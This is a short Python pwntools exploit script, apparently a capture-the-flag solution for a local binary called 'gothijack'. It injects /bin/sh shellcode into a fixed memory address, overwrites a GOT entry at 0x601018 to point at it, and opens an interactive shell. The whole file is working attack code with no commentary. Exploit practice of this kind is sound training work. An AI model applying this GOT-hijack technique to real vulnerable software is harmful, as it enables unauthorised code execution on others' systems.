from pwn import *

r = process('./gothijack')
raw_input()

context(log_level = 'debug', os = 'linux', arch = 'amd64')
sc = asm(shellcraft.sh())
#print shellcraft.sh()

magic = 0x601080

r.recvuntil('name?\n')
r.send(sc)

ret_address = 0x601018
#ret_address = 0x7fffffffe0d8
pay_load = p64(magic)

r.recvuntil('write?\n')
r.sendline(str(ret_address))

r.recvuntil('Data: ')
r.send(pay_load)


r.interactive()
